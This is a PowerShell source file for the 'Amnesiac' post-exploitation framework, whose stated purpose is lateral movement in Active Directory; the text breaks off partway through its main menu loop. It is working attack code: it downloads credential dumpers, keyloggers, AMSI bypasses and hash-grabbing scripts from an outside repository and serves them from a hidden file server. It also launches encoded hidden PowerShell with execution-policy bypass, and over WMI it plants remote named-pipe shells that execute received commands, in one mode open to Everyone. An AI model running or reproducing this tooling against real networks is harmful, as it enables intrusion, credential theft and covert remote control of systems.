function Amnesiac {

	<#
	.SYNOPSIS
	Amnesiac Author: Rob LP (@L3o4j)
	
	.DESCRIPTION
	Post-Exploitation framework designed to assist with lateral movement within Active Directory environments
	URL: https://github.com/Leo4j/Amnesiac	
	#>
    
	param (
        [string]$Command,
		[string]$Domain,
		[string]$DomainController,
		[string]$Targets,
		[string]$Timeout = "30000",
		[string]$GlobalPipeName,
		[string]$IP,
		[string]$UserName,
		[string]$Password,
		[switch]$SkipPortScan,
		[switch]$ScanMode,
		[switch]$CheckTargets,
		[switch]$Detached,
		[switch]$Night
    )
	
	if($Detached -AND -not $IP){
		Write-Output ""
		Write-Output "[-] Please provide your host IP address: -IP <YOUR-IP>"
		Write-Output ""
		
		$PossibleIPAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
			Where-Object { $_.InterfaceAlias -notlike 'Loopback*' -and 
						   ($_.IPAddress.StartsWith("10.") -or 
							$_.IPAddress -match "^172\.(1[6-9]|2[0-9]|3[0-1])\." -or 
							$_.IPAddress.StartsWith("192.168.")) } | 
			Select-Object -Property IPAddress -ExpandProperty IPAddress
		Write-Output "[*] Available IP addresses:"
		Write-Output ""
		foreach($IP in $PossibleIPAddresses){
			Write-Output "$IP"
		}
		Write-Output ""
		break
	}
	
	if($Detached){$global:Detach = $True}
	else{$global:Detach = $False}
	
	$global:IP = $null
	if($IP){$global:IP = $IP}
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	# Folder Structure Creation
	$basePath = "C:\Users\Public\Documents\Amnesiac"
	$subfolders = @("Clipboard", "Downloads", "History", "Keylogger", "Payloads", "Screenshots", "Scripts", "Monitor_TGTs")
	if (-not (Test-Path $basePath)) {New-Item -Path $basePath -ItemType Directory > $null}
	$subfolders | ForEach-Object {$subfolderPath = Join-Path -Path $basePath -ChildPath $_;if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null}}
	
	# Global Variables Setup
	Remove-Variable -Name FileServerProcess -Scope Global -ErrorAction SilentlyContinue
	$global:ServerURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"
	$global:directAdminSessions = @()
	$global:listenerSessions = New-Object 'System.Collections.Generic.List[psobject]'
	$global:MultipleSessions = New-Object 'System.Collections.Generic.List[psobject]'
	$globalrandomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
	if(!$GlobalPipeName){$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''}
	else{$global:MultiPipeName = "$GlobalPipeName"}
	$global:bookmarks = New-Object 'System.Collections.Generic.List[psobject]'
	$global:payloadformat = 'b64'
	$global:localadminaccesspayload = 'SMB'
	$global:AdminCheckProtocol = 'SMB'
	$global:AllOurTargets = @()
	$global:UserDefinedTargetsPath = $null
	$global:AllUserDefinedTargets = $null
	$global:Message = $null
	$global:RestoreTimeout = $False
	$global:ScanModer = $False
	
	if(!$ScanMode){$global:Message = " [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"}
	
	$ShowSessions = $True
	$ShowMenuCommands = $False
	$ShowUserDefinedTargets = $False
	$ShowBookmarks = $True
	
	if($Targets){
		$TestPath = Test-Path $Targets
		if($TestPath){
			$global:AllUserDefinedTargets = @()
			$UserDefinedTargets = @()
			$global:AllUserDefinedTargets = Get-Content -Path $Targets
			$global:AllUserDefinedTargets = $global:AllUserDefinedTargets | Sort-Object -Unique
			$UserDefinedTargets = $global:AllUserDefinedTargets
		}
		else{
			$global:AllUserDefinedTargets = @()
			$UserDefinedTargets = @()
			$global:AllUserDefinedTargets = $Targets -split "," | ForEach-Object { $_.Trim() }
			$UserDefinedTargets = $global:AllUserDefinedTargets
		}
		if($CheckTargets){
			$UserDefinedTargets = CheckReachableHosts
			$UserDefinedTargets = $UserDefinedTargets | Where-Object { $_ -ne '' -and $_ -ne $null }
			$global:AllUserDefinedTargets = $UserDefinedTargets
		}
	}
	
	while ($true) {

		# Display the Session Menu
		Write-Output ""
		Display-SessionMenu

		if($ScanMode -OR $global:ScanModer){$choice = 3}
		else{
			# Get User Input
			if(($global:directAdminSessions.Count -gt 0) -OR ($global:listenerSessions.Count -gt 0) -OR ($global:MultipleSessions.Count -gt 0)){
				[Console]::Write(" Choose an option or session number, or type 'exit' to quit ")
				$choice = Read-Host
			}
			else{
				[Console]::Write(" Choose an option or type 'exit' to quit ")
				$choice = Read-Host
			}
		}
		
		$choice = $choice.Trim()

		if ($choice -eq '') {continue}
		
		if ($choice -eq 'sessions') {
			if(($global:directAdminSessions.Count -gt 0) -OR ($global:listenerSessions.Count -gt 0) -OR ($global:MultipleSessions.Count -gt 0)){
				if($ShowSessions){$ShowSessions = $False}
				else{$ShowSessions = $True}
			}
			else{$global:Message = " [-] No Sessions established."}
			continue
		}
		
		if ($choice -eq 'help') {
			if($ShowMenuCommands){$ShowMenuCommands = $False}
			else{$ShowMenuCommands = $True}
			continue
		}
		
		if ($choice -eq 'Bookmarks') {
			if($global:bookmarks){
				if($ShowBookmarks){$ShowBookmarks = $False}
				else{$ShowBookmarks = $True}
			}
			else{$global:Message = " [-] No Bookmarks set."}
			continue
		}
		
		if ($choice -eq 'toggle') {
			if($global:payloadformat -eq 'b64'){
				$global:payloadformat = 'pwsh'
				$global:Message = " [+] Payload format: pwsh"
			}
			elseif($global:payloadformat -eq 'pwsh'){
				$global:payloadformat = 'pwraw'
				$global:Message = " [+] Payload format: pwsh(raw)"
			}
			elseif($global:payloadformat -eq 'pwraw'){
				$global:payloadformat = 'raw'
				$global:Message = " [+] Payload format: cmd(raw)"
			}
			elseif($global:payloadformat -eq 'raw'){
				$global:payloadformat = 'gzip'
				$global:Message = " [+] Payload format: gzip"
			}
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				$global:Message = " [+] Payload format: exe"
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'b64'
				$global:Message = " [+] Payload format: cmd(b64)"
			}
			continue
		}
		
		if ($choice -eq 'Find-LocalAdminAccess') {
			if($global:localadminaccesspayload -eq 'SMB'){
				$global:localadminaccesspayload = 'PSRemoting'
				$global:Message = " [+] Find-LocalAdminAccess Method: PSRemoting"
			}
			elseif($global:localadminaccesspayload -eq 'PSRemoting'){
				$global:localadminaccesspayload = 'SMB'
				$global:Message = " [+] Find-LocalAdminAccess Method: SMB"
			}
			continue
		}
		
		if ($choice -eq 'switch') {
			if($global:AdminCheckProtocol -eq 'SMB'){
				$global:AdminCheckProtocol = 'WMI'
				$global:Message = " [+] Admin Access Scan Protocol: WMI"
			}
			elseif($global:AdminCheckProtocol -eq 'WMI'){
				$global:AdminCheckProtocol = 'SMB'
				$global:Message = " [+] Admin Access Scan Protocol: SMB"
			}
			continue
		}
		
		if ($choice -eq 'scramble') {
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			$global:Message = " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			continue
		}
		
		if ($choice -eq 'exit') {
			
			for ($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--) {
				$selectedSession = $global:listenerSessions[$i]
				
				try {
					# Send 'kill' command to the session
					InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName -ExecuteExitCommand > $null
					$global:Message += " [+] Session killed [$($selectedSession.ComputerName)]`n"
				} catch {
					# Handle or log errors
					Write-Error " [-] Failed to exit session with PipeName: $($selectedSession.PipeName). Error: $_"
				}
			}
			
			$global:listenerSessions.Clear()
			
			for ($i = $global:MultipleSessions.Count - 1; $i -ge 0; $i--) {
				$selectedMultiSession = $global:MultipleSessions[$i]
				
				try {
					# Send 'kill' command to the session
					InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID -ExecuteExitCommand > $null
					$global:Message += " [+] Session killed [$($selectedMultiSession.ComputerName)]`n"
				} catch {
					# Handle or log errors
					Write-Error " [-] Failed to exit session with PipeName: $($selectedMultiSession.PipeName). Error: $_"
				}
			}
			
			$global:MultipleSessions.Clear()
			
			Write-Output ""
			$global:Message = $global:Message -split "`n"
			$global:Message = $global:Message | Where-Object { $_ -ne '' -and $_ -ne $null }
			foreach ($line in $global:Message) {
				Write-Output $line
			}
			$global:Message = $null
			Write-Output ""
			
			if($global:FileServerProcess){
				Stop-Process -Id $global:FileServerProcess.Id -ErrorAction SilentlyContinue
				Remove-Variable -Name FileServerProcess -Scope Global -ErrorAction SilentlyContinue
			}
			
			break
		}
		
		if ($choice -eq 'targets') {
			if($UserDefinedTargets){
				if($ShowUserDefinedTargets){$ShowUserDefinedTargets = $False}
				else{$ShowUserDefinedTargets = $True}
			}
			else{$global:Message = " [-] No User-Defined Targets. Scope: All";$ShowUserDefinedTargets = $False}
			continue
		}
		
		if ($choice -eq 'kill all') {
			
			# Remove all bookmarks associated with single listener and multi listener sessions
			for ($j = $global:bookmarks.Count - 1; $j -ge 0; $j--) {
				$bookmarkIdentifier = $global:bookmarks[$j].Identifier

				# Check if the identifier exists in the listener sessions
				$listenerMatch = $global:listenerSessions | Where-Object { $_.PipeName -eq $bookmarkIdentifier }
				
				# Check if the identifier exists in the multi listener sessions
				$multiListenerMatch = $global:MultipleSessions | Where-Object { $_.UniquePipeID -eq $bookmarkIdentifier }

				if ($listenerMatch -or $multiListenerMatch) {
					$global:bookmarks.RemoveAt($j)
				}
			}
			
			for ($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--) {
				$selectedSession = $global:listenerSessions[$i]
				
				try {
					# Send 'kill' command to the session
					InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName -ExecuteExitCommand > $null
					
					$global:Message += " [+] Session killed [$($selectedSession.ComputerName)]`n"
					
				} catch {
					# Handle or log errors
					Write-Error " [-] Failed to exit session with PipeName: $($selectedSession.PipeName). Error: $_"
				}
			}
			
			$global:listenerSessions.Clear()
			
			for ($i = $global:MultipleSessions.Count - 1; $i -ge 0; $i--) {
				$selectedMultiSession = $global:MultipleSessions[$i]
				
				try {
					# Send 'kill' command to the session
					InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID -ExecuteExitCommand > $null
					
					$global:Message += " [+] Session killed [$($selectedMultiSession.ComputerName)]`n"
					
				} catch {
					# Handle or log errors
					Write-Error " [-] Failed to exit session with PipeName: $($selectedMultiSession.PipeName). Error: $_"
				}
			}
			
			$global:MultipleSessions.Clear()
			
			continue
			
		}
		
		if ($choice -like "Serve*") {
			
			$commandParts = $choice -split '\s+', 3

			$userdefPort = $commandParts[1]
			$userdefPath = $commandParts[2]

			if($userdefPath){$userdefPath = $userdefPath.TrimEnd('\')}
			else{$userdefPath = "c:\Users\Public\Documents\Amnesiac\Scripts"}
			
			if(!$userdefPort){$userdefPort = 8080}
			
			if($Detached){$DefineHostname = $global:IP}
			else{$DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName}
			
			$urls = @(
				"$($global:ServerURL)/Ask4Creds.ps1",
				"$($global:ServerURL)/Find-LocalAdminAccess.ps1",
				"$($global:ServerURL)/Invoke-SessionHunter.ps1",
				"$($global:ServerURL)/PInject.ps1",
				"$($global:ServerURL)/Invoke-SMBRemoting.ps1",
				"$($global:ServerURL)/Invoke-WMIRemoting.ps1",
				"$($global:ServerURL)/Token-Impersonation.ps1",
				"$($global:ServerURL)/Tkn_Access_Check.ps1",
				"$($global:ServerURL)/Invoke-GrabTheHash.ps1",
				"$($global:ServerURL)/klg.ps1",
				"$($global:ServerURL)/cms.ps1",
				"$($global:ServerURL)/dumper.ps1",
				"$($global:ServerURL)/SimpleAMSI.ps1",
				"$($global:ServerURL)/NETAMSI.ps1",
				"$($global:ServerURL)/HiveDump.ps1",
				"$($global:ServerURL)/Invoke-Patamenia.ps1",
				"$($global:ServerURL)/Suntour.ps1",
				"$($global:ServerURL)/Ferrari.ps1",
				"$($global:ServerURL)/pwv.ps1",
    				"$($global:ServerURL)/RDPKeylog.exe",
				"$($global:ServerURL)/TGT_Monitor.ps1"
			)
			
			# Specify the folder where files will be downloaded
			$destinationFolder = $userdefPath

			# Create the folder if it does not exist
			if (-not (Test-Path -Path $destinationFolder)) {
				New-Item -ItemType Directory -Force -Path $destinationFolder
			}
			
			Write-Output ""
			Write-Output " [+] Downloading Scripts to $destinationFolder"
			
			$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
			$runspacePool.Open()

			$runspaces = @()

			foreach ($url in $urls) {
				# Create a separate variable that will be captured by the script block
				$currentUrl = $url

				$powershell = [powershell]::Create().AddScript({
					param($url, $destinationFolder)

					function Get-FileNameFromUrl {
						param ([string]$url)
						$uri = [System.Uri]$url
						$filename = [System.IO.Path]::GetFileName($uri.LocalPath)
						return $filename -replace '[^A-Za-z0-9.-]', '_'
					}

					function Download-File {
						param($url, $destinationPath)
						try {
							Invoke-WebRequest -Uri $url -OutFile $destinationPath
						} catch {
							Write-Output "Error downloading '$url': $_"
						}
					}

					$fileName = Get-FileNameFromUrl -url $url
					$destinationPath = Join-Path -Path $destinationFolder -ChildPath $fileName

					if (!(Test-Path -Path $destinationPath)) {
						Download-File -url $url -destinationPath $destinationPath
					}
				}).AddArgument($currentUrl).AddArgument($destinationFolder)

				$powershell.RunspacePool = $runspacePool

				$runspaces += [PSCustomObject]@{
					Pipe = $powershell
					Status = $powershell.BeginInvoke()
				}
			}

			foreach ($runspace in $runspaces) {
				$runspace.Pipe.EndInvoke($runspace.Status)
				$runspace.Pipe.Dispose()
			}

			$runspacePool.Close()
			$runspacePool.Dispose()
			
			$global:ServerURL = "http://$($DefineHostname):$userdefPort"
			
			$scriptWithCommand = $FileServerScript + "`nFile-Server -Port $userdefPort -Path $userdefPath"

			$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)

			$encodedCommand = [Convert]::ToBase64String($bytes)

			$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ep Bypass", "-NoProfile", "-enc $encodedCommand" -PassThru

			$processId = $global:FileServerProcess.Id

			$global:Message += " [+] File Server started with PID $processId. To kill it [Stop-Process -Id $processId]"
			
			# Embedded monitoring script
			$parentProcessId = $PID
			
			$FileServerMonitoringScript = @"
while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq $parentProcessId }

	if (-not `$process) {
		# If the process is not running, kill the File Server
		Stop-Process -Id $processId
		break # Exit the monitoring script
	}
}
exit
"@
			$b64FileServerMonitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FileServerMonitoringScript))
	
			# Execute the embedded monitoring script in a hidden window
			Start-Process powershell.exe -ArgumentList "-WindowS Hidden -ep Bypass -enc $b64FileServerMonitoringScript" -WindowStyle Hidden
			
			continue
		}
		
		if ($choice -like "RepoURL*") {
			
			$commandParts = $choice -split '\s+', 2

			$userdefURL = $commandParts[1]

			if($userdefURL){
				$userdefURL = $userdefURL.TrimEnd('/')
				$global:ServerURL = $userdefURL
			}
			else{$global:ServerURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"}
			
			$global:Message += " [+] Repo URL set to $global:ServerURL"
			
			if($global:FileServerProcess){
				Stop-Process -Id $global:FileServerProcess.Id -ErrorAction SilentlyContinue
				Remove-Variable -Name FileServerProcess -Scope Global -ErrorAction SilentlyContinue
			}
			
			continue
			
		}
		
		$commandParts = $choice -split '\s+', 2
		
		if ($commandParts[0] -eq 'GLSet' -and $commandParts[1]) {
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = $commandParts[1]
			$global:Message = " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			continue
		}
		
		if ($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'clear') {
			if($UserDefinedTargets){
				$UserDefinedTargets = $null
				$global:AllUserDefinedTargets = $null
				$global:UserDefinedTargetsPath = $null
				$ShowUserDefinedTargets = $False
				$global:Message = " [+] Targets Cleared"
			} else {$global:Message = " [-] No Targets Defined"}
			continue
			
		}
		
		if ($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'check') {
			if($UserDefinedTargets){
				if($Domain -AND $DomainController){$UserDefinedTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController}
				else{$UserDefinedTargets = CheckReachableHosts}
				$UserDefinedTargets = $UserDefinedTargets | Where-Object { $_ -ne '' -and $_ -ne $null }
				$global:AllUserDefinedTargets = $UserDefinedTargets
				$global:Message = " [+] Targets Check Completed"
			} else {$global:Message = " [-] No Targets Defined"}
			continue
			
		}
		
		if ($commandParts[0] -eq 'targets' -and $commandParts[1]) {
			$commandParts[1] = $commandParts[1] -replace '^"|"$', ''
			$TestPath = Test-Path $commandParts[1]
			
			if($TestPath){
				$UserDefinedTargets = Get-Content -Path $commandParts[1]
				$UserDefinedTargets = $UserDefinedTargets | Sort-Object -Unique
				$global:UserDefinedTargetsPath = $commandParts[1]
				$global:AllUserDefinedTargets = $UserDefinedTargets
				$global:Message = " [+] Targets loaded. Type 'targets' to list/hide them"
			}
			else{
				$global:AllUserDefinedTargets = @()
				$UserDefinedTargets = @()
				$global:AllUserDefinedTargets = $commandParts[1] -split "," | ForEach-Object { $_.Trim() }
				$UserDefinedTargets = $global:AllUserDefinedTargets
    				$global:Message = " [+] Targets set. Type 'targets' to list/hide them"
			}
			
			continue
		}
		
		if ($commandParts[0] -eq 'bookmark' -and $commandParts[1] -match '^\d+$') {
			
			$sessionNumber = [int]$commandParts[1]
			
			# Compute end indices for the various session categories
			$directAdminEndIndex = 4 + $global:directAdminSessions.Count
			$listenerEndIndex = $directAdminEndIndex + $global:listenerSessions.Count
			$globalListenerEndIndex = $listenerEndIndex + $global:MultipleSessions.Count
			
			if ($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex) {
				$selectedIndex = $sessionNumber - 5
				$bookmark = [PSCustomObject]@{
					'DisplayName' = " [$sessionNumber]"
					'DisplayComputerName' = $global:directAdminSessions[$selectedIndex]
					'DisplayUserID' = "nt authority\system"
					'Identifier'  = $null  # Admin sessions don't have a unique identifier
				}
				$global:bookmarks.Add($bookmark)
			}
			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count
				$bookmark = [PSCustomObject]@{
					'DisplayName' = " [$sessionNumber]"
					'DisplayComputerName' = $global:listenerSessions[$selectedIndex].ComputerName
					'DisplayUserID' = $global:listenerSessions[$selectedIndex].UserID
					'Identifier'  = $global:listenerSessions[$selectedIndex].PipeName
				}
				$global:bookmarks.Add($bookmark)
			}
			elseif ($sessionNumber -gt $listenerEndIndex -and $sessionNumber -le $globalListenerEndIndex) {
				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
				$bookmark = [PSCustomObject]@{
					'DisplayName' = " [$sessionNumber]"
					'DisplayComputerName' = $global:MultipleSessions[$selectedIndex].ComputerName
					'DisplayUserID' = $global:MultipleSessions[$selectedIndex].UserID
					'Identifier'  = $global:MultipleSessions[$selectedIndex].UniquePipeID
				}
				$global:bookmarks.Add($bookmark)
			}
			else {
				$global:Message = " [-] Invalid session number. Please try again."
			}
			
			continue
		}
		
		if ($commandParts[0] -eq 'unbookmark' -and $commandParts[1] -match '^\d+$') {
			# Extract the desired index from the user input
			$desiredIndex = "[{0}]" -f $commandParts[1]

			# Find the bookmark with the matching display index
			$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }

			# Remove the bookmark if it exists
			if ($bookmarkToRemove) {
				$global:bookmarks.Remove($bookmarkToRemove) > $null
				$global:Message = " Removed bookmark $desiredIndex"
			} else {
				$global:Message = " No bookmark found $desiredIndex"
			}
			
			continue
		}
		
		if ($commandParts[0] -eq 'kill' -and $commandParts[1] -match '^\d+$') {
			$sessionNumber = [int]$commandParts[1]
			
			$directAdminEndIndex = 4 + $global:directAdminSessions.Count
			$listenerEndIndex = $directAdminEndIndex + $global:listenerSessions.Count
			
			if ($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex) {
				$selectedIndex = $sessionNumber - 5
				$selectedTarget = $global:directAdminSessions[$selectedIndex]
				$global:Message = " [-] Killing Admin sessions is not needed, they are not active"
				
			}
			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count
				$selectedSession = $global:listenerSessions[$selectedIndex]
				
				# Extract the unique identifier
				$identifierToRemove = $selectedSession.PipeName
				
				# Use the function to kill this session
				InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName -ExecuteExitCommand > $null
				
				# Remove the session from the single list
				$indexToRemove = -1

				for ($i = 0; $i -lt $global:listenerSessions.Count; $i++) {
					if ($global:listenerSessions[$i].PipeName -eq $selectedSession.PipeName) {
						$indexToRemove = $i
						break
					}
				}

				if ($indexToRemove -ne -1) {
					$global:listenerSessions.RemoveAt($indexToRemove)

					# Calculate the desiredIndex for the removed session
					$desiredIndex = "[{0}]" -f ($indexToRemove + 5 + $global:directAdminSessions.Count) # Adjust for base numbering and other sessions' count
					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
					if ($bookmarkToRemove) {
						$global:bookmarks.Remove($bookmarkToRemove) > $null
					}
					
					$global:Message += " [+] Session killed [$($selectedSession.ComputerName)]`n"
				}
			}
			elseif ($sessionNumber -gt $listenerEndIndex) {
				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
				$selectedMultiSession  = $global:MultipleSessions[$selectedIndex]
				
				# Extract the unique identifier
				$identifierToRemove = $selectedMultiSession.UniquePipeID
				
				# Use your function to kill this session
				InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID -ExecuteExitCommand > $null
				
				# Remove the session from the global list
				$indexToRemove = -1

				for ($i = 0; $i -lt $global:MultipleSessions.Count; $i++) {
					if ($global:MultipleSessions[$i].UniquePipeID -eq $selectedMultiSession.UniquePipeID) {
						$indexToRemove = $i
						break
					}
				}

				if ($indexToRemove -ne -1) {
					$global:MultipleSessions.RemoveAt($indexToRemove)
					
					# Calculate the desiredIndex for the removed session
					$desiredIndex = "[{0}]" -f ($indexToRemove + 5 + $global:directAdminSessions.Count + $global:listenerSessions.Count) # Adjust for base numbering and other sessions' count
					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
					if ($bookmarkToRemove) {
						$global:bookmarks.Remove($bookmarkToRemove) > $null
					}
					
					$global:Message += " [+] Session killed [$($selectedMultiSession.ComputerName)]`n"
				}
				
			}
			else {
				$global:Message = " [-] Invalid session number. Please try again."
			}
			
			# Remove the associated bookmark, if it exists
			if ($null -ne $identifierToRemove) {
				$indexToRemove = $null
				for ($i = 0; $i -lt $global:bookmarks.Count; $i++) {
					if ($global:bookmarks[$i].Identifier -eq $identifierToRemove) {
						$indexToRemove = $i
						break
					}
				}

				if ($null -ne $indexToRemove) {
					$global:bookmarks.RemoveAt($indexToRemove)
				}
			}
			
			continue
		}
		
		try{$choice = [int]$choice}
		catch{$global:Message = " [-] Invalid command. Type 'help' to list/hide available commands";continue}
		
		switch ($choice) {
			'0' {
				if($global:AdminCheckProtocol -eq 'SMB'){
					# Check network for admin access
					if($Domain -AND $DomainController){$allTargets = CheckAdminAccess -Domain $Domain -DomainController $DomainController}
					else{$allTargets = CheckAdminAccess}
					
					if($allTargets){
						$global:Message = " [+] Admin Access: $($allTargets.count) Targets [SMB]"
						foreach ($target in $allTargets) {
							# Check if this target is not already in sessions
								if (-not ($global:directAdminSessions -contains $target)) {
								$global:directAdminSessions += $target
							}
						}
					}
					
					else{$global:Message = " [-] No Admin Access [SMB]";continue}
				}
				elseif($global:AdminCheckProtocol -eq 'WMI'){
					# Check network for admin access
					if($Domain -AND $DomainController){$allReachTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController -WMI}
					else{$allReachTargets = CheckReachableHosts -WMI}
					$allReachTargets = $allReachTargets -Join ","
					
					$global:OldPipeNameToRestore = $global:MultiPipeName
					
					$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
					
					$PN = $global:MultiPipeName
					
					$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
					
					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
	
					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
					$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
			
					$finalstring = $finalstring -replace '"', "'"
					
					$TempAdminAccessTargets = WMIAdminAccess -Targets $allReachTargets -Command $finalstring
					
					if($TempAdminAccessTargets){
						
						$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [WMI]"
					
						$global:ScanModer = $True
						$global:RestoreOldMultiPipeName = $True
						$global:OldTargetsToRestore = $global:AllUserDefinedTargets
						$global:AllUserDefinedTargets = $TempAdminAccessTargets
						$global:RestoreAllUserDefinedTargets = $True
						
						continue
					}
					else{$global:Message = " [-] No Admin Access [WMI]";continue}
				}
			}
			'1' {
				Start-Listener
			}
			'2' {
				Print-MultiListener
			}
			'3' {
				if($ScanMode -OR $global:ScanModer){$ScanMode = $False;$global:ScanModer = $False}
				else{Write-Output ""}
				Write-Output " Scanning will stop in 40 seconds..."
				Write-Output ""
				
				$timeout = 40
				$elapsedTime = 0
				$timeInterval = 1 
				
				while ($elapsedTime -lt $timeout) {
					#Start-Sleep -Milliseconds 500
					#if($PlaceHolder){$PlaceHolder = $False;$Host.UI.RawUI.FlushInputBuffer()}
					if($Domain -AND $DomainController){Scan-WaitingTargets -Domain $Domain -DomainController $DomainController}
					else{Scan-WaitingTargets}
					$global:Message = $global:Message -split "`n"
					$global:Message = $global:Message | Where-Object { $_ -ne '' -and $_ -ne $null }
					foreach ($line in $global:Message) {
						Write-Output $line
					}
